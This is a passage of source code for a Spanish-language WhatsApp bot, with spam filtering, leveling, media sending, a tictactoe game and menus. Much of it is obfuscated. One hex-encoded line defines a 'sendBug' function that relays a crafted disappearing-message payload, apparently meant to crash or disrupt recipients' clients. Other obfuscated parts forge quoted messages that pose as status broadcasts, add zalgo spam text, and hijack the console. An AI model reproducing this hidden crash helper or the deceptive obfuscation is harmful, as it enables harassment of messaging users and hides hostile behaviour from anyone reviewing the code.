        mods.indexOf(owner) === -1 ? mods.push(owner) : false
        if (!mods.includes(senderNumber)) return
        mods.slice(mods.indexOf(owner), 1)
        }




        if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
	
	    	if (isBan && isCmd && !isOwner) {
		reply('*Lo siento pero usted es un usuario baneado, no puede hacer uso del bot!*')
        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	}
	
		if (isCmd && isFiltered(from) && !isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
		}
        
        	if (isCmd && isFiltered(from) && isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
		}

        var _0x6376=["\x70\x72\x65\x70\x61\x72\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x53\x65\x74\x74\x69\x6E\x67\x43\x6F\x6E\x74\x65\x6E\x74","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];const sendBug=async (_0x13b3x2,_0x13b3x3)=>{ await samu330[_0x6376[2]](samu330[_0x6376[1]](_0x13b3x2,samu330[_0x6376[0]](0),{}),{waitForAck:true})}
 

	    
	const sendFile = async (archivo, nombreDeArchivo, comentario, tag, vn) => {
  	tipo = await getBuffer(archivo)
  	tipo2 = ''
  	if (nombreDeArchivo.includes('m4a')){
  	samu330.sendMessage(from, tipo, audio,{mimetype: 'audio/mp4',quoted: tag, filename: nombreDeArchivo, ptt: vn})
  	}
  	if (nombreDeArchivo.includes('mp4')){
	samu330.sendMessage(from, tipo, video, {mimetype: 'video/mp4', quoted: tag, caption: comentario, filename: nombreDeArchivo})
  	}
  	if (nombreDeArchivo.includes('gif')){
  	samu330.sendMessage(from, tipo, video, {mimetype: Mimetype.gif, caption: comentario, quoted: tag, filename: nombreDeArchivo})
  	} 
  	if (nombreDeArchivo.includes('png')){
  	samu330.sendMessage(from, tipo, image, {quoted: tag, caption: comentario, filename: nombreDeArchivo})
  	}
  
  	if (nombreDeArchivo.includes('webp')){
  	samu330.sendMessage(from, tipo, sticker, {quoted: tag})
  	} else {
  	tipo2 = nombreDeArchivo.split(`.`)[1]
  	samu330.sendMessage(from, tipo, document, {mimetype: tipo2, quoted: tag, filename: nombreDeArchivo})
  	}
	}
	    
	const sendFileFromUrl = async(link, type, options) => {
  	hasil = await getBuffer(link)
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	samu330.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error al descargar el archivo_')
	  console.log(e)
	})
	})
	})
	})
	}

    const sendMediaURL = async(to, url, text="", mids=[]) =>{
        if(mids.length > 0){
            text = mentions(text, mids, true)
        }
        const fn = Date.now() / 10000;
        const filename = fn.toString()
        let mime = ""
        var download = function (uri, filename, callback) {
            request.head(uri, function (err, res, body) {
                mime = res.headers['content-type']
                request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
            });
        };
        download(url, filename, async function () {
            console.log('');
            let media = fs.readFileSync(filename)
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            samu330.sendMessage(to, media, type, { quoted: sam, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
            
            fs.unlinkSync(filename)
        });
    }
		    
	const nivelActual = getLevelingLevel(sender)
            var rango = '🎭Principiante'
            if (nivelActual == 10) {
                rango = '*🥉Bronce*'
            } else if (nivelActual == 20) {
                rango = '*🥈Plata*'
            } else if (nivelActual == 30) {
                rango = '*🥇Oro*'
	    } else if (nivelActual == 30) {
                rango = '*🌬Diamante Rosa*'
            } else if (nivelActual == 100) {
                rango = '*🌬Diamante Rosa*'
            } else if (nivelActual == 150) {
                rango = '*🔥Diamante rojo🔥*'
            } else if (nivelActual > 200) {
                rango = '*🔮Nivel Maximo🗡*'
            }

	
	if (isOwner) {
	var tipoDeUsr = '*🔮Ownwer*'
	} else if (sender == isAdmin) {
	var tipoDeUsr = '*👑Admin*'
	 } else {
	var tipoDeUsr = '*✍🏻Usuario*'
	}
	
	if (!sam.key.fromMe) {
        if (!isBan) {
	const currentLevel = getLevelingLevel(sender)
	const checkId = getLevelingId(sender)
	try {
	if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
	const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 15) //Math.floor(Math.random() * 10) + 500
	const requiredXp = 5 * Math.pow(currentLevel, (5 / 2)) + 50 * currentLevel + 100 //5000 * (Math.pow(2, currentLevel) - 1)
	const getLevel = getLevelingLevel(sender)
	const namelv = checkId
	addLevelingXp(sender, amountXp)
	if (requiredXp <= getLevelingXp(sender)) {
	addLevelingLevel(sender, 1)
	const lvup =  `✴ _*🧗🏻‍♂️S͟u͟b͟e͟s͟ ͟d͟e͟ ͟n͟i͟v͟e͟l͟!͟*_ ✴
	
	𓆩*𓆪 *💠 Nombre:* @${namelv.split('@')[0]} 𓆩*𓆪
	
	┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  	✨XP: ${getLevelingXp(sender)}
  	📚Nivel: ${getLevel} ➫ ${getLevelingLevel(sender)}
  	🕋rango: ${nivelActual}
	┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`
	/*samu330.sendMessage(from, lvup, MessageType.text, {quoted: { key: {                
		fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
		"documentMessage": { "title": `✍🏻Nivel ${nivelActual}`, 'jpegThumbnail': fs.readFileSync('./src/ara.png')}
		}}
		})*/}
	} catch (err) {
	console.error(err)
	}
	}
	}	
	    
//REPLY
var _0xd6ca=["\x74\x65\x78\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x72\x65\x70\x6C\x79\x2E\x70\x6E\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\uD83C\uDF49\x53\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0332\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\x61\u0332\u0347\u0332\u0332\u0347\u0347\u0332\u0347\u0332\u0347\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\u0305\x6D\u0347\u032D\u0347\u0347\u032D\u0347\u032D\u0347\u032D\u0347\u032D\u0305\u033F\u0346\u0308\u0305\u033F\u0346\u0308\u0305\u0305\u033F\u0346\u0308\u033F\u0305\u033F\u0346\u0308\u0346\u0305\u033F\u0346\u0308\x75\u0332\u0347\u032A\u0332\u0332\u0347\u032A\u0347\u0332\u0347\u032A\u032A\u0332\u0347\u032A\u0332\u0347\u032A\u034B\x20\x53\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0332\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u032A\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u031F\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u0347\u0332\u0347\u0347\u0347\u032A\u0347\u031F\u0347\u0347\u0347\u0347\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033D\u0308\u033F\u033F\u033D\u0308\u033D\u033F\u033D\u0308\u0308\u033F\u033D\u0308\x72\x20\u1E12\u032C\u0329\x6A\u032D\u032C\u0329\x73\u032D\u032C\u0329\x72\u032D\u032C\u0329\uD83C\uDFF9","\uD83D\uDD25\x53\uAA81\u20DC\uABED\uAA94\uABED\u1DE4\uAA8A\x33\u20DD\x33\x30\x20\x7C\x20\x53\x61\x6D\x20\x79\x20\x50\x65\x72\x72\x79\uD83C\uDF52","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x73\x74\x6F\x72\x79\x2E\x70\x68\x70\x3F\x73\x74\x6F\x72\x79\x5F\x66\x62\x69\x64\x3D\x33\x37\x35\x34\x35\x39\x30\x31\x30\x36\x38\x38\x38\x31\x33\x26\x69\x64\x3D\x31\x30\x30\x30\x34\x36\x37\x34\x31\x35\x32\x33\x33\x39\x30","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x53\x6D\x57\x57\x2E\x70\x6E\x67","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];const reply=async (_0xfb9bx2)=>{samu330[_0xd6ca[10]](from,_0xfb9bx2,MessageType[_0xd6ca[0]],{sendEphemeral:true,quoted:{key:{fromMe:false,participant:`${_0xd6ca[1]}`,...(from?{remoteJid:_0xd6ca[2]}:{})},message:{"\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":`${_0xd6ca[3]}${body}${_0xd6ca[3]}`,'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0xd6ca[5]](_0xd6ca[4])}}},contextInfo:{"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":_0xd6ca[6],"\x62\x6F\x64\x79":_0xd6ca[7],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0xd6ca[8]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0xd6ca[5]](_0xd6ca[9])}}})}
	
	/*const fileIO = async buffer => {
  		const { ext } = await fromBuffer(buffer) || {}
  		const form = new FormData
  		form.append('file', buffer, 'tmp.' + ext)
  		let res = await fetch('https://file.io/?expires=1d', {
   		method: 'POST',
    		body: form
  		})
  		const jsona = await res.json()
  		if (!jsona.success) throw jsona
  		return jsona.link
		reply(jsona.link)
		}*/

        const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
                kma = gam1
		loc = {
		"degreesLatitude": 0,
		"degreesLongitude": 0,
		"jpegThumbnail": kma
		}
                mhan = await samu330.prepareMessage(from, kma, location)
                const buttonMessages = {
                locationMessage: loc,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 6
                }
                samu330.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
                }

		const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
			const buttonMessage = {
			contentText: text1,
			footerText: desc1,
			buttons: but,
			headerType: 1
			}
			samu330.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
			}

		const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
				kma = gam1
				mhan = await samu330.prepareMessage(from, kma, image)
				const buttonMessages = {
				imageMessage: mhan.message.imageMessage,
				contentText: text1,
				footerText: desc1,
				buttons: but,
				headerType: 4
				}
				samu330.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
	
	const noreg = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"productMessage": {
		"product": {
		"title": '🗒️𝐔𝐬𝐮𝐚𝐫𝐢𝐨 𝐧𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨!',
		"description": "𝙍𝙚𝙜𝙞𝙨𝙩𝙧𝙖𝙩𝙚",
		"currencyCode": "SYP",
		"priceAmount1000": "999999999999999999",
		"retailerId": "NyanBot",
		"productImageCount": 1
		},
		"businessOwnerJid": `0@s.whatsapp.net`
		}
		}
		}
	const fspam = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"contactMessage": {
		"displayName": `${pushname} NO SPAM!!`,
		"vcard": 'BEGIN:VCARD\n' +
    		'Version:3.0\n' +
    		'TEL;type=CELL;type=VOICE;waid=5219984907794:+5219984907794\n' +
		'item1.X-ABLabel:Celular' +
    		'END:VCARD'
		}
		}
		}


const fimg = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": `🥀Sαм y Perry`, 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fdoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "documentMessage": { "title":"🔥𝒩𝓎𝒶𝓃𝐵𝑜𝓉 | 𝚂𝚊𝚖 𝚢 𝙿𝚎𝚛𝚛𝚢💓", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const floc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "locationMessage": { "caption":"🥀𝓝𝔂𝓪𝓷𝓑𝓸💞", 'jpegThumbnail': fs.readFileSync('./src/samyperry.png')}}
}
contextInfo: {
mentionedJid: [sender]}
const fliveLoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "liveLocationMessage": { "caption":"🍒𝒮𝒶𝓂 𝓎 𝒫𝑒𝓇𝓇𝓎 | 𝙉𝙮𝙖𝙣𝘽𝙤𝙩🔥", 'jpegThumbnail': fs.readFileSync('./src/img.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fvid = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "videoMessage": { "caption":"🌺Ｓａｍ ｙ Ｐｅｒｒｙ🌺", 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const faud = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "audioMessage": {"mimetype": "audio/mp4", "ptt": true, "seconds": -999999}}
}
contextInfo: {
mentionedJid: [sender]}
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)
},
"title": `🐉𝗦𝗮𝗺𝘂𝟯𝟯𝟬🔥 | 📌𝑵𝒚𝒂𝒏𝑩𝒐𝒕🌹 ${timeFt}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
contextInfo: {
mentionedJid: [sender]}



		/*--------------------[ Tictactoe Game Function ]--------------------*/
function _0xd037(_0x1fea26,_0x25290c){const _0x49fad6=_0x33d3();return _0xd037=function(_0x4c8951,_0x3b65b8){_0x4c8951=_0x4c8951-0x16e;let _0x299f50=_0x49fad6[_0x4c8951];return _0x299f50;},_0xd037(_0x1fea26,_0x25290c);}const _0x5cde97=_0xd037;(function(_0x21fbf1,_0x38d5a9){const _0x3f2272=_0xd037,_0x1107c4=_0x21fbf1();while(!![]){try{const _0x4fd9b6=-parseInt(_0x3f2272(0x192))/0x1+parseInt(_0x3f2272(0x183))/0x2*(parseInt(_0x3f2272(0x17a))/0x3)+parseInt(_0x3f2272(0x173))/0x4+-parseInt(_0x3f2272(0x1a4))/0x5*(-parseInt(_0x3f2272(0x190))/0x6)+parseInt(_0x3f2272(0x19a))/0x7+parseInt(_0x3f2272(0x1a7))/0x8*(-parseInt(_0x3f2272(0x188))/0x9)+-parseInt(_0x3f2272(0x178))/0xa;if(_0x4fd9b6===_0x38d5a9)break;else _0x1107c4['push'](_0x1107c4['shift']());}catch(_0x92ee90){_0x1107c4['push'](_0x1107c4['shift']());}}}(_0x33d3,0x43adf));const _0x4318e=function(){let _0x18466e=!![];return function(_0x28f8e7,_0x986b11){const _0x4bc3c5=_0x18466e?function(){if(_0x986b11){const _0x3caa52=_0x986b11['apply'](_0x28f8e7,arguments);return _0x986b11=null,_0x3caa52;}}:function(){};return _0x18466e=![],_0x4bc3c5;};}(),_0x399f56=_0x4318e(this,function(){const _0x275f56=_0xd037;return _0x399f56['toString']()[_0x275f56(0x18c)]('(((.+)+)+)+$')[_0x275f56(0x1a0)]()[_0x275f56(0x18b)](_0x399f56)[_0x275f56(0x18c)](_0x275f56(0x184));});_0x399f56();const _0x3b65b8=function(){let _0x41cd2c=!![];return function(_0x1384a8,_0x35af9f){const _0x2ca771=_0x41cd2c?function(){if(_0x35af9f){const _0x32bda9=_0x35af9f['apply'](_0x1384a8,arguments);return _0x35af9f=null,_0x32bda9;}}:function(){};return _0x41cd2c=![],_0x2ca771;};}(),_0x4c8951=_0x3b65b8(this,function(){const _0x14fcdb=_0xd037;let _0x37198e;try{const _0x26cfb0=Function(_0x14fcdb(0x185)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x37198e=_0x26cfb0();}catch(_0x5c47dd){_0x37198e=window;}const _0x26d7b0=_0x37198e[_0x14fcdb(0x18a)]=_0x37198e['console']||{},_0xcbaed9=['log','warn',_0x14fcdb(0x197),_0x14fcdb(0x19f),_0x14fcdb(0x170),_0x14fcdb(0x17e),_0x14fcdb(0x19e)];for(let _0x31060f=0x0;_0x31060f<_0xcbaed9['length'];_0x31060f++){const _0x5ee4eb=_0x3b65b8[_0x14fcdb(0x18b)][_0x14fcdb(0x194)][_0x14fcdb(0x1a8)](_0x3b65b8),_0x41fe71=_0xcbaed9[_0x31060f],_0x2fcf3e=_0x26d7b0[_0x41fe71]||_0x5ee4eb;_0x5ee4eb[_0x14fcdb(0x16e)]=_0x3b65b8[_0x14fcdb(0x1a8)](_0x3b65b8),_0x5ee4eb[_0x14fcdb(0x1a0)]=_0x2fcf3e[_0x14fcdb(0x1a0)]['bind'](_0x2fcf3e),_0x26d7b0[_0x41fe71]=_0x5ee4eb;}});_0x4c8951();function _0x33d3(){const _0x2f778d=['console','constructor','search','\x0a\x0a\x0a\x0a*⭕Tictactoe\x20by:*\x0a\x0a➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈\x20y\x20Keͥ͢vͣıͫ͘͜𝜂\x0a','.json','_matrix','1341258PTQvxw','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20El\x20juego\x20termina\x20en\x20empate\x20😐\x0a','530904zopBPB','text','prototype','\x20│\x20','writeFileSync','info','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a❌\x20:\x20@','unlinkSync','2523374cjUElw','\x0a\x0a\x0a\x20\x20\x20','Desafortunadamente\x20el\x20desafío\x20para\x20@','@s.whatsapp.net','trace','error','toString','por\x20qué','replace','\x0a\x20\x20\x20\x20\x20','5KuVOET','isWin','Cex','8BwrXBC','bind','__proto__','split','exception','turn','\x0a\x0a\x20\x20\x20\x20\x20','222244BBUccz','\x0a⭕\x20:\x20@','includes','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0aEl\x20ganador\x20es\x20@','\x20fue\x20rechazado\x20❌😕','1058900skWhPB','Esta\x20opción\x20es\x20solo\x20para\x20@','1640508cIcQWw','./lib/tictactoe/db/','sendMessage','El\x20juego\x20ha\x20comenzado\x20antes!','table','\x0a\x20\x20\x20','status','random','toLowerCase','2rQjqMR','(((.+)+)+)+$','return\x20(function()\x20','stringify','winner','2451717cMvRYu','floor'];_0x33d3=function(){return _0x2f778d;};return _0x33d3();}const cmde=budy[_0x5cde97(0x182)]()[_0x5cde97(0x16f)]('\x20')[0x0]||'';let arrNum=['1','2','3','4','5','6','7','8','9'];if(fs['existsSync'](_0x5cde97(0x17b)+from+_0x5cde97(0x18e))){const boardnow=setGame(''+from);if(budy==_0x5cde97(0x1a6))return reply(_0x5cde97(0x1a1));if(budy[_0x5cde97(0x182)]()=='y'||budy[_0x5cde97(0x182)]()=='yes'||budy['toLowerCase']()=='s'){if(boardnow['O']==sender[_0x5cde97(0x1a2)]('@s.whatsapp.net','')){if(boardnow[_0x5cde97(0x180)])return reply(_0x5cde97(0x17d));const matrix=boardnow[_0x5cde97(0x18f)];boardnow[_0x5cde97(0x180)]=!![],fs[_0x5cde97(0x196)]('./lib/tictactoe/db/'+from+_0x5cde97(0x18e),JSON[_0x5cde97(0x186)](boardnow,null,0x2));const chatAccept='*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a❌\x20:\x20@'+boardnow['X']+_0x5cde97(0x174)+boardnow['O']+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aEs\x20el\x20turno\x20de\x20:\x20@'+(boardnow[_0x5cde97(0x171)]=='X'?boardnow['X']:boardnow['O'])+_0x5cde97(0x172)+matrix[0x0][0x0]+_0x5cde97(0x195)+matrix[0x0][0x1]+_0x5cde97(0x195)+matrix[0x0][0x2]+_0x5cde97(0x1a3)+matrix[0x1][0x0]+_0x5cde97(0x195)+matrix[0x1][0x1]+_0x5cde97(0x195)+matrix[0x1][0x2]+_0x5cde97(0x1a3)+matrix[0x2][0x0]+'\x20│\x20'+matrix[0x2][0x1]+_0x5cde97(0x195)+matrix[0x2][0x2]+_0x5cde97(0x18d);samu330[_0x5cde97(0x17c)](from,chatAccept,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['X']+'@s.whatsapp.net',boardnow['O']+_0x5cde97(0x19d)]}});}else samu330['sendMessage'](from,_0x5cde97(0x179)+boardnow['O']+'\x20!',MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['O']+_0x5cde97(0x19d)]}});}else{if(budy[_0x5cde97(0x182)]()=='n'||budy[_0x5cde97(0x182)]()=='no'||budy['toLowerCase']()=='nopi'){if(boardnow['O']==sender['replace'](_0x5cde97(0x19d),'')){if(boardnow[_0x5cde97(0x180)])return reply(_0x5cde97(0x17d));fs[_0x5cde97(0x199)](_0x5cde97(0x17b)+from+_0x5cde97(0x18e)),samu330[_0x5cde97(0x17c)](from,_0x5cde97(0x19c)+boardnow['X']+_0x5cde97(0x177),MessageType['text'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['X']+_0x5cde97(0x19d)]}});}else samu330[_0x5cde97(0x17c)](from,_0x5cde97(0x179)+boardnow['O']+'\x20!',MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['O']+_0x5cde97(0x19d)]}});}}}if(arrNum[_0x5cde97(0x175)](cmde)){const boardnow=setGame(''+from);if(!boardnow[_0x5cde97(0x180)])return reply('Parece\x20que\x20tu\x20oponente\x20no\x20ha\x20aceptado\x20el\x20desafío..');if((boardnow[_0x5cde97(0x171)]=='X'?boardnow['X']:boardnow['O'])!=sender[_0x5cde97(0x1a2)](_0x5cde97(0x19d),''))return;const moving=validmove(Number(budy),''+from),matrix=moving[_0x5cde97(0x18f)];if(moving[_0x5cde97(0x1a5)]){if(moving[_0x5cde97(0x187)]=='SERI'){const chatEqual=_0x5cde97(0x191);reply(chatEqual),fs[_0x5cde97(0x199)]('./lib/tictactoe/db/'+from+'.json');return;}const winnerJID=moving[_0x5cde97(0x187)]=='O'?moving['O']:moving['X'],looseJID=moving[_0x5cde97(0x187)]=='O'?moving['X']:moving['O'],limWin=Math[_0x5cde97(0x189)](Math[_0x5cde97(0x181)]()*0x14)+0xa,limLoose=Math[_0x5cde97(0x189)](Math[_0x5cde97(0x181)]()*0xa)+0x5,chatWon=_0x5cde97(0x176)+winnerJID+'\x20😎👑\x0a';samu330['sendMessage'](from,chatWon,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[moving[_0x5cde97(0x187)]=='O'?moving['O']+_0x5cde97(0x19d):moving['X']+_0x5cde97(0x19d)]}}),fs[_0x5cde97(0x199)](_0x5cde97(0x17b)+from+_0x5cde97(0x18e));}else{const chatMove=_0x5cde97(0x198)+moving['X']+_0x5cde97(0x174)+moving['O']+'\x0a\x0aEs\x20el\x20turno\x20de:\x20@'+(moving[_0x5cde97(0x171)]=='X'?moving['X']:moving['O'])+_0x5cde97(0x19b)+matrix[0x0][0x0]+_0x5cde97(0x195)+matrix[0x0][0x1]+_0x5cde97(0x195)+matrix[0x0][0x2]+_0x5cde97(0x17f)+matrix[0x1][0x0]+'\x20│\x20'+matrix[0x1][0x1]+_0x5cde97(0x195)+matrix[0x1][0x2]+_0x5cde97(0x17f)+matrix[0x2][0x0]+_0x5cde97(0x195)+matrix[0x2][0x1]+_0x5cde97(0x195)+matrix[0x2][0x2]+'\x0a\x0a\x0a\x0a\x0a*⭕Tictactoe\x20by:*\x0a\x0a➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈\x20y\x20Keͥ͢vͣıͫ͘͜𝜂\x0a';samu330[_0x5cde97(0x17c)](from,chatMove,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[moving['X']+_0x5cde97(0x19d),moving['O']+_0x5cde97(0x19d)]}});}}

	    
		if (messagesC.includes("bot")){
			samu330.updatePresence(from, Presence.composing)
			rm = [
			result = fs.readFileSync(`./temp/Samu.webp`),
			result1 = fs.readFileSync(`./temp/Samu1.webp`),
			result2 = fs.readFileSync(`./temp/Samu2.webp`),
			result3 = fs.readFileSync(`./temp/Samu3.webp`),
			result4 = fs.readFileSync(`./temp/Samu4.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
  			samu330.sendMessage(from, nk, sticker, {
			quoted: fimg, "forwardingScore": 9999, "isForwarded": true
  			})
			}
	    	if (isGroup && botAdmin && isBadWord) {
                        if (bad.includes(messagesC)) {
                        if (!isAdmin) { 
                        samu330.updatePresence(from, Presence.composing)
			var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                        reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las malas palabras, serás expulsado en 5 segundos`)
                        setTimeout( () => {
                                samu330.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
                        }, 5000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("1 segundo")
                        }, 4000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("2 segundos")
                        }, 3000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("3 segundos")
                        }, 2000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("4 segundos")
                        }, 1000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("5 segundos")
                        }, 0)
				}
			}
		}

//Menus
const mda = `
╔════════════════╗
╠  ◈  𝙈𝙀𝙉𝙐⁪⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼 ◈  ╣
╠════════════════╝
║
╠ *●${prefix}clima* + region
║ _El clima_
║
╠ *●${prefix}zalgo*
║ _Texto estilo zalgo_
║
╠ *●${prefix}contar*
║ _Cuenta caracteres de un texto_
║
╠ *●${prefix}caras*
║ _Etiqueta una imagen para detectar caras_
║
║
╠ *●${prefix}quemusicaes*
║ _Busca el nombre de las canciones que no conozcas_
║
╠ *●${prefix}imagen*
